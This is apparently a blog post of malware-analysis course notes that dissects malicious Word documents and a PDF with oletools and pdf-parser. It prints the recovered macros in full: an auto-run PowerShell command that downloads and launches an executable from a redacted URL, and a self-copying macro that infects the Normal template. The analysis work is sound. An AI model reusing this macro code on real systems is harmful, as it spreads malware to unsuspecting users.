<!doctype html><html lang=en><meta charset=utf-8>
<meta name=viewport content="width=device-width">
<title>Analyzing document-based malware and reverse engineering it | Henry Post</title>
<meta name=generator content="Hugo Eureka 0.8.0">
<link rel=stylesheet href=/css/eureka.min.css>
<script defer src=/js/eureka.min.js></script>
<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
<link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload="this.onload=null,this.rel='stylesheet'">
<link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css media=print onload="this.media='all',this.onload=null" crossorigin>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/languages/dart.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js integrity="sha256-uNYoXefWRqv+PsIF/OflNmwtKM4lStn9yrz2gVl6ymo=" crossorigin></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X media=print onload="this.media='all',this.onload=null" crossorigin>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
<script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js integrity="sha256-Zmpaaj+GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE=" crossorigin></script>
<link rel=icon type=image/png sizes=32x32 href=/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_32x32_fill_box_center_3.png>
<link rel=apple-touch-icon sizes=180x180 href=/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_180x180_fill_box_center_3.png>
<meta name=description content="The course The course this post is based off of is Expert Malware Analysis and Reverse Engineering by Abhinav Singh.
https://www.udemy.com/course/expert-malware-analysis-and-reverse-engineering/
My code All of my code I used to create these screenshots and data is below.
https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable
The last commit that this content was modified on can be accessed below.
https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/
Tools   Windows VM
 https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable    Documents
 oledump oleid olemeta    PDFs
 pdf-parser pdfid pdfobjflow3    MS Office file formats OLE Compound file  You can use oledump and oletools to view OLE files.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"/posts/"},{"@type":"ListItem","position":2,"name":"Analyzing document-based malware and reverse engineering it","item":"/posts/2020-04-27-analyzing-document-based-malware-and-reverse-engineering-it/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/2020-04-27-analyzing-document-based-malware-and-reverse-engineering-it/"},"headline":"Analyzing document-based malware and reverse engineering it | Henry Post","datePublished":"2020-04-27T00:00:00+00:00","dateModified":"2020-04-27T00:00:00+00:00","wordCount":3063,"publisher":{"@type":"Person","name":"C. Wang","logo":{"@type":"ImageObject","url":"/images/icon.png"}},"description":"The course The course this post is based off of is Expert Malware Analysis and Reverse Engineering by Abhinav Singh.\nhttps:\/\/www.udemy.com\/course\/expert-malware-analysis-and-reverse-engineering\/\nMy code All of my code I used to create these screenshots and data is below.\nhttps:\/\/github.com\/HenryFBP\/VagrantPackerFiles\/tree\/master\/vagrant\/windows-analysis-and-vulnerable\nThe last commit that this content was modified on can be accessed below.\nhttps:\/\/github.com\/HenryFBP\/VagrantPackerFiles\/tree\/d2175b7252f8d3e16e0a41e193a9c7da35942245\/\nTools   Windows VM\n https:\/\/github.com\/HenryFBP\/VagrantPackerFiles\/tree\/master\/vagrant\/windows-analysis-and-vulnerable    Documents\n oledump oleid olemeta    PDFs\n pdf-parser pdfid pdfobjflow3    MS Office file formats OLE Compound file  You can use oledump and oletools to view OLE files."}</script><meta property="og:title" content="Analyzing document-based malware and reverse engineering it | Henry Post">
<meta property="og:type" content="article">
<meta property="og:image" content="/images/icon.png">
<meta property="og:url" content="/posts/2020-04-27-analyzing-document-based-malware-and-reverse-engineering-it/">
<meta property="og:description" content="The course The course this post is based off of is Expert Malware Analysis and Reverse Engineering by Abhinav Singh.
https://www.udemy.com/course/expert-malware-analysis-and-reverse-engineering/
My code All of my code I used to create these screenshots and data is below.
https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable
The last commit that this content was modified on can be accessed below.
https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/
Tools   Windows VM
 https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable    Documents
 oledump oleid olemeta    PDFs
 pdf-parser pdfid pdfobjflow3    MS Office file formats OLE Compound file  You can use oledump and oletools to view OLE files.">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="Henry Post">
<meta property="article:published_time" content="2020-04-27T00:00:00+00:00">
<meta property="article:modified_time" content="2020-04-27T00:00:00+00:00">
<meta property="article:section" content="posts">
<body class="flex flex-col min-h-screen">
<header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
<div class="w-full max-w-screen-xl mx-auto"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=='Auto'||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName('html')[0].classList.add('dark')</script>
<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
<a href=/ class="mr-6 text-primary-text text-xl font-bold">Henry Post</a>
<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
<i class="fas fa-bars"></i>
</button>
<div id=target class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
<div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
<a href=/about-site/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">About Site</a>
<a href=/contact/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Contact</a>
<a href=/posts/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 selected-menu-item mr-4">Posts</a>
<a href=/hobbies/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Hobbies</a>
<a href=/projects/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Projects</a>
<a href=/resume/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Resume</a>
<a href=/skills/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Skills</a>
<a href=/certifications/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Certifications</a>
<a href=/why-me/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Why me?</a>
</div>
<div class=flex>
<div class="relative pt-4 md:pt-0">
<div class="cursor-pointer hover:text-eureka" id=lightDarkMode>
<i class="fas fa-adjust"></i>
</div>
<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open>
</div>
<div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions>
<span class="px-4 py-1 hover:text-eureka" name=Light>Light</span>
<span class="px-4 py-1 hover:text-eureka" name=Dark>Dark</span>
<span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span>
</div>
</div>
</div>
</div>
<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile>
</div>
</nav>
<script>let element=document.getElementById('lightDarkMode');storageColorScheme==null||storageColorScheme=='Auto'?document.addEventListener('DOMContentLoaded',()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change',switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'sun'),element.firstElementChild.classList.add('fa-sun')):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'moon'),element.firstElementChild.classList.add('fa-moon')),document.addEventListener('DOMContentLoaded',()=>{getcolorscheme(),switchBurger()})</script>
</div>
</header>
<main class="flex-grow pt-16">
<div class=pl-scrollbar>
<div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">
<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
<div class="col-span-2 lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
<h1 class="font-bold text-3xl text-primary-text">Analyzing document-based malware and reverse engineering it</h1>
<div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
<div class="mr-6 my-2">
<i class="fas fa-calendar mr-1"></i>
<span>2020-04-27</span>
</div>
<div class="mr-6 my-2">
<i class="fas fa-clock mr-1"></i>
<span>15 min read</span>
</div>
<div class="mr-6 my-2">
<i class="fas fa-folder mr-1"></i>
<a href=/categories/security/ class=hover:text-eureka>security</a>
<span>, </span>
<a href=/categories/hacking/ class=hover:text-eureka>hacking</a>
<span>, </span>
<a href=/categories/programming/ class=hover:text-eureka>programming</a>
</div>
</div>
<div class=content>
<h2 id=the-course>The course</h2>
<p>The course this post is based off of is Expert Malware Analysis and Reverse Engineering by Abhinav Singh.</p>
<p><a href=https://www.udemy.com/course/expert-malware-analysis-and-reverse-engineering/>https://www.udemy.com/course/expert-malware-analysis-and-reverse-engineering/</a></p>
<h2 id=my-code>My code</h2>
<p>All of my code I used to create these screenshots and data is below.</p>
<p><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable>https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable</a></p>
<p>The last commit that this content was modified on can be accessed below.</p>
<p><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/>https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/</a></p>
<h2 id=tools>Tools</h2>
<ul>
<li>
<p>Windows VM</p>
<ul>
<li><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable>https://github.com/HenryFBP/VagrantPackerFiles/tree/master/vagrant/windows-analysis-and-vulnerable</a></li>
</ul>
</li>
<li>
<p>Documents</p>
<ul>
<li><code>oledump</code></li>
<li><code>oleid</code></li>
<li><code>olemeta</code></li>
</ul>
</li>
<li>
<p>PDFs</p>
<ul>
<li><code>pdf-parser</code></li>
<li><code>pdfid</code></li>
<li><a href=https://github.com/HenryFBP/pdfobjflow3-python3><code>pdfobjflow3</code></a></li>
</ul>
</li>
</ul>
<h2 id=ms-office-file-formats>MS Office file formats</h2>
<h3 id=ole-compound-file>OLE Compound file</h3>
<ul>
<li>You can use <code>oledump</code> and <code>oletools</code> to view OLE files.</li>
</ul>
<p><a href=https://olefile.readthedocs.io/en/latest/OLE_Overview.html>https://olefile.readthedocs.io/en/latest/OLE_Overview.html</a></p>
<ul>
<li><code>.doc</code>, not <code>.docx</code>.</li>
<li>OLE = Object Linking and Embedding</li>
<li>Tree of linked objects
<ul>
<li>Objects can be of stream or storage type</li>
</ul>
</li>
<li>Office 2003-1997</li>
<li>Magic bytes <code>D0 CF 11 E0 A1 B1 1A E1</code></li>
<li>Macros and the text content are all stored in file objects that are themselves stored in folder objects</li>
</ul>
<p><img src=/images/2020-04-27-analyzing-document-based-malware/OLE_VBA_sample.png alt="OLE tree structure example, from https://olefile.readthedocs.io/en/latest/_images/OLE_VBA_sample.png"></p>
<h3 id=openoffice-xml>OpenOffice XML</h3>
<ul>
<li>Compressed ZIP file with a different extension, rename to <code>*.zip</code></li>
<li>Try it out with a docx file!</li>
</ul>
<h2 id=analyzing-malware>Analyzing malware</h2>
<h3 id=the-files>The files</h3>
<p><a href=https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/vagrant/windows-analysis-and-vulnerable/shared/malware>https://github.com/HenryFBP/VagrantPackerFiles/tree/d2175b7252f8d3e16e0a41e193a9c7da35942245/vagrant/windows-analysis-and-vulnerable/shared/malware</a></p>
<h3 id=paymentdoc-notes>payment.doc notes</h3>
<ul>
<li><code>oledump payment.doc</code></li>
<li>interesting that there are macros, viewing number 5/6 should yield interesting results.</li>
<li>number 7: capital M <code>7: M</code></li>
<li><code>oledump payment.doc -s 7</code> to view dump of macro. It appears to load malicious code from the web.</li>
<li><code>oledump payment.doc -s 7 -d</code> will show a columnar hexdump.</li>
</ul>
<h4 id=oledump-paymentdoc--s-7--v><code>oledump payment.doc -s 7 -v</code></h4>
<p>This gives decompressed vba code!</p>
<pre><code class=language-vb>Attribute VB_Name = &quot;ThisDocument&quot;
Attribute VB_Base = &quot;1Normal.ThisDocument&quot;
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_Open()
Shell (&quot;cmd.exe /c PoWerSHElL (nEW-oBjEcT sYsTeM.neT.wEBcLiEnT).dOWNLOadfIlE('hxxp://&lt;REDACTED&gt;/NDGAFV.exe','%Appdata%\playa.exe');&amp;start %Appdata%\playa.exe&amp; exit&quot;)
End Sub
</code></pre>
<h4 id=oleid-paymentdoc><code>oleid .\payment.doc</code></h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; oleid .\payment.doc                                                                   oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: .\payment.doc
 Indicator                      Value
 OLE format                     True
 Has SummaryInformation stream  True
 Application name               b'Microsoft Office Word'
 Encrypted                      False
 Word Document                  True
 VBA Macros                     True
 Excel Workbook                 False
 PowerPoint Presentation        False
 Visio Drawing                  False
 ObjectPool                     False
 Flash objects                  0
</code></pre>
<h4 id=olemeta-paymentdoc><code>olemeta .\payment.doc</code></h4>
<pre><code class=language-vb>
PS C:\Users\vagrant\Desktop\work&gt; olemeta .\payment.doc
olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: .\payment.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |admin                         |
|keywords             |                              |
|comments             |                              |
|template             |Normal.dotm                   |
|last_saved_by        |admin                         |
|revision_number      |1                             |
|total_edit_time      |180                           |
|create_time          |2016-06-29 17:09:00           |
|last_saved_time      |2016-06-29 17:12:00           |
|num_pages            |1                             |
|num_words            |0                             |
|num_chars            |0                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the DocumentSummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |0                             |
|paragraphs           |0                             |
|scale_crop           |False                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |0                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |983040                        |
+---------------------+------------------------------+
</code></pre>
<h4 id=oledir-paymentdoc><code>oledir .\payment.doc</code></h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; oledir.exe .\payment.doc
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file .\payment.doc:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |&lt;Used&gt;|Root   |Root Entry            |-    |-    |3    |2A      |4992
1   |&lt;Used&gt;|Stream |1Table                |-    |-    |-    |8       |6830
2   |&lt;Used&gt;|Stream |WordDocument          |5    |-    |-    |0       |4096
3   |&lt;Used&gt;|Stream |\x05SummaryInformation|2    |4    |-    |16      |4096
4   |&lt;Used&gt;|Stream |\x05DocumentSummaryInf|-    |-    |-    |1E      |4096
    |      |       |ormation              |     |     |     |        |
5   |&lt;Used&gt;|Storage|Macros                |1    |12   |11   |0       |0
6   |&lt;Used&gt;|Storage|VBA                   |-    |-    |7    |0       |0
7   |&lt;Used&gt;|Stream |ThisDocument          |9    |8    |-    |0       |1471
8   |&lt;Used&gt;|Stream |_VBA_PROJECT          |-    |-    |-    |17      |2322
9   |&lt;Used&gt;|Stream |dir                   |-    |-    |-    |3C      |514
10  |&lt;Used&gt;|Stream |PROJECTwm             |-    |-    |-    |45      |41
11  |&lt;Used&gt;|Stream |PROJECT               |6    |10   |-    |46      |379
12  |&lt;Used&gt;|Stream |\x01CompObj           |-    |-    |-    |4C      |114
13  |unused|Empty  |                      |-    |-    |-    |0       |0
14  |unused|Empty  |                      |-    |-    |-    |0       |0
15  |unused|Empty  |                      |-    |-    |-    |0       |0
----+----------------------------+------+--------------------------------------
id  |Name                        |Size  |CLSID
----+----------------------------+------+--------------------------------------
0   |Root Entry                  |-     |00020906-0000-0000-C000-000000000046
    |                            |      |Microsoft Word 97-2003 Document
    |                            |      |(Word.Document.8)
12  |\x01CompObj                 |114   |
4   |\x05DocumentSummaryInformati|4096  |
    |on                          |      |
3   |\x05SummaryInformation      |4096  |
1   |1Table                      |6830  |
5   |Macros                      |-     |
11  |  PROJECT                   |379   |
10  |  PROJECTwm                 |41    |
6   |  VBA                       |-     |
7   |    ThisDocument            |1471  |
8   |    _VBA_PROJECT            |2322  |
9   |    dir                     |514   |
2   |WordDocument                |4096  |
PS C:\Users\vagrant\Desktop\work&gt;
</code></pre>
<h4 id=olemapexe-paymentdoc><code>olemap.exe .\payment.doc</code></h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; olemap.exe .\payment.doc
olemap 0.55 - http://decalage.info/python/oletools
-------------------------------------------------------------------------------
FILE: .\payment.doc

OLE HEADER:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|OLE Signature (hex)     |D0CF11E0A1B11AE1|Should be D0CF11E0A1B11AE1         |
|Header CLSID            |                |Should be empty (0)                |
|Minor Version           |003E            |Should be 003E                     |
|Major Version           |0003            |Should be 3 or 4                   |
|Byte Order              |FFFE            |Should be FFFE (little endian)     |
|Sector Shift            |0009            |Should be 0009 or 000C             |
|# of Dir Sectors        |0               |Should be 0 if major version is 3  |
|# of FAT Sectors        |1               |                                   |
|First Dir Sector        |00000027        |(hex)                              |
|Transaction Sig Number  |0               |Should be 0                        |
|MiniStream cutoff       |4096            |Should be 4096 bytes               |
|First MiniFAT Sector    |00000029        |(hex)                              |
|# of MiniFAT Sectors    |1               |                                   |
|First DIFAT Sector      |FFFFFFFE        |(hex)                              |
|# of DIFAT Sectors      |0               |                                   |
+------------------------+----------------+-----------------------------------+

CALCULATED ATTRIBUTES:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|Sector Size (bytes)     |512             |Should be 512 or 4096 bytes        |
|Actual File Size (bytes)|28160           |Real file size on disk             |
|Max File Size in FAT    |66048.0         |Max file size covered by FAT       |
|Extra data beyond FAT   |0               |Only if file is larger than FAT    |
|                        |                |coverage                           |
|Extra data offset in FAT|00006E00        |Offset of the 1st free sector at   |
|                        |                |end of FAT                         |
|Extra data size         |0               |Size of data starting at the 1st   |
|                        |                |free sector at end of FAT          |
+------------------------+----------------+-----------------------------------+
</code></pre>
<h3 id=statementsdocx-notes>statements.docx notes</h3>
<h4 id=oledump-statementsdocx><code>oledump statements.docx</code></h4>
<pre><code class=language-vb>C:\Users\vagrant\Desktop\work&gt;oledump statements.docx
A: word/vbaProject.bin
 A1:       372 'PROJECT'
 A2:        41 'PROJECTwm'
 A3: M    7636 'VBA/ThisDocument'
 A4:      2769 'VBA/_VBA_PROJECT'
 A5:      1093 'VBA/__SRP_0'
 A6:        98 'VBA/__SRP_1'
 A7:       216 'VBA/__SRP_2'
 A8:        66 'VBA/__SRP_3'
 A9:       479 'VBA/dir'
</code></pre>
<h4 id=oledump-statementsdocx--s-a3--v>oledump statements.docx -s A3 -v</h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; oledump statements.docx -s A3 -v
Attribute VB_Name = &quot;ThisDocument&quot;
Attribute VB_Base = &quot;0{00020906-0000-0000-C000-000000000046}&quot;
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'RELAX
Private Sub RELAX2()
End
End Sub

Private Sub ComboBox1_Change()

End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = &quot;C:\temp.tmp&quot;
MacroContainer.VBProject.vbcomponents.Item(&quot;ThisDocument&quot;).Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk&amp; = InStr(1, keimeno, &quot;'RELAX&quot;)
keimeno = Right$(keimeno, Len(keimeno) - kk&amp; + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.vbcomponents.Item(&quot;ThisDocument&quot;).Export x$
Else
ActiveDocument.VBProject.vbcomponents.Item(&quot;ThisDocument&quot;).Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, &quot;'RELAX&quot;)
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.vbcomponents.Item(&quot;ThisDocument&quot;).CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.vbcomponents.Item(&quot;ThisDocument&quot;).CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) &lt;&gt; &quot;&quot; Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_Open()
Call GOODSub
End Sub
</code></pre>
<h4 id=olevba-paymentdoc><code>olevba .\payment.doc</code></h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; olevba .\payment.doc                                                                                olevba 0.55.1 on Python 3.7.2 - http://decalage.info/python/oletools
===============================================================================
FILE: .\payment.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: .\payment.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Shell (&quot;cmd.exe /c PoWerSHElL (nEW-oBjEcT sYsTeM.neT.wEBcLiEnT).dOWNLOadfIlE('hxxp://&lt;REDACTED&gt;/NDGAFV.exe','%Appdata%\playa.exe');&amp;start %Appdata%\playa.exe&amp; exit&quot;)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|PoWerSHElL          |May run PowerShell commands                  |
|Suspicious|nEW-oBjEcT          |May create an OLE object using PowerShell    |
|Suspicious|neT.wEBcLiEnT       |May download files from the Internet using   |
|          |                    |PowerShell                                   |
|Suspicious|dOWNLOadfIlE        |May download files from the Internet using   |
|          |                    |PowerShell                                   |
|Suspicious|sYsTeM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |hxxp://XXXXXXXXXXXXX|URL                                          |
|          |XXXXXXXX/NDGAFV.exe'|                                             |
|          |,'%Appdata%\playa.ex|                                             |
|          |e'                  |                                             |
|IOC       |cmd.exe             |Executable file name                         |
|IOC       |NDGAFV.exe          |Executable file name                         |
|IOC       |playa.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
</code></pre>
<h4 id=mraptor-paymentdoc><code>mraptor .\payment.doc</code></h4>
<pre><code class=language-vb>PS C:\Users\vagrant\Desktop\work&gt; mraptor .\payment.doc                                                                               MacroRaptor 0.55 - http://decalage.info/python/oletools
This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
----------+-----+----+--------------------------------------------------------
Result    |Flags|Type|File
----------+-----+----+--------------------------------------------------------
SUSPICIOUS|A-X  |OLE:|.\payment.doc

Flags: A=AutoExec, W=Write, X=Execute
Exit code: 20 - SUSPICIOUS
</code></pre>
<h2 id=pdf-file-format>PDF File Format</h2>
<ul>
<li>Portable Document Format</li>
<li>Very simple file format,
<ul>
<li>text-based</li>
<li>Dictionary and stream-based</li>
</ul>
</li>
<li>Supports rich and interactive elements</li>
<li>Can run ActionScript and JavaScript
<ul>
<li>Dynamic loading, form filling, etc</li>
</ul>
</li>
<li>4 major sections:
<ul>
<li>Header</li>
<li>Body</li>
<li>xref</li>
<li>Trailer</li>
</ul>
</li>
</ul>
<h3 id=simple-pdf-file-objects>Simple pdf file objects:</h3>
<h4 id=header>Header</h4>
<p>Has version number.</p>
<h4 id=objects>Objects</h4>
<p>&#171; denotes a dict obj</p>
<p>An object looks like this:</p>
<pre><code>&lt;NAME&gt; &lt;VERSION&gt; obj
    &lt;&lt;
        &lt;CONTENT&gt;
    &gt;&gt;
endobj
</code></pre>
<h4 id=cross-reference-table>Cross Reference Table</h4>
<ul>
<li>Quick access to objects</li>
<li><code>xref &lt;NEWLINE></code></li>
<li><code>0 4</code> (zero=start, 4=end)</li>
<li><code>0000000000 65535 f</code> explained:
<ul>
<li><code>0000000000</code> is a 10-digit byte offset of the object starting from the beginning of the doc</li>
<li><code>65535</code> is a 5-digit generation number (???) that the PDF-creating tool generates</li>
<li><code>n</code> or <code>f</code> is an &lsquo;entry type&rsquo;, <code>n</code> means in-use, <code>f</code> means free.</li>
</ul>
</li>
<li><code>trailer</code> contains overall info about the PDF</li>
</ul>
<h5 id=example-pdf-file-content>Example pdf file content</h5>
<pre><code class=language-python>%PDF-1.7

1 0 obj
  &lt;&lt; /Type /Catalog
     /Pages 2 0 R
  &gt;&gt;
endobj

2 0 obj
  &lt;&lt; /Type /Pages
     /Kids [3 0 R]
     /Count 1
  &gt;&gt;
endobj

3 0 obj
  &lt;&lt; /Type /Page
     /Parent 2 0 R
     /MediaBox [0 0 600 400]
     /Resources &lt;&lt; &gt;&gt;
  &gt;&gt;
endobj

xref
0 4
00000000000 65535 f 
00000000010 00000 n 
00000000069 00000 n 
00000000141 00000 n 
trailer
  &lt;&lt; /Root 1 0 R
     /Size 4
  &gt;&gt;
startxref
249
%%EOF
</code></pre>
<h2 id=first-pdf-file-example1pdf>First PDF file, example1.pdf</h2>
<h3 id=graph>Graph</h3>
<p>Result of <code>pdf-parser example1.pdf | pdfobjflow3</code>:</p>
<img src=/images/2020-04-27-analyzing-document-based-malware/example1-pdfobjflow.png>
<h3 id=font-files>Font files</h3>
<p>The first PDF file contains about 3-4 embedded font files.</p>
<img src=/images/2020-04-27-analyzing-document-based-malware/example1-embedded-fonts.PNG>
<h3 id=malicious-js>Malicious JS</h3>
<img src=/images/2020-04-27-analyzing-document-based-malware/example1-js-unescaped.PNG>
<p>The only overtly malicious content is a JavaScript call to a potentially malicious URL, in Object 24.</p>
<p>What is &lsquo;this.getURL()&rsquo;?</p>
<p>Well, the &lsquo;JavaScript for Acrobat API Reference&rsquo;, page 315, says:</p>
<pre><code>Gets the specified URL over the Internet using a GET.
</code></pre>
<p>This code downloads data (code, images, who knows?) from a different server and into wherever this stream is embedded.</p>
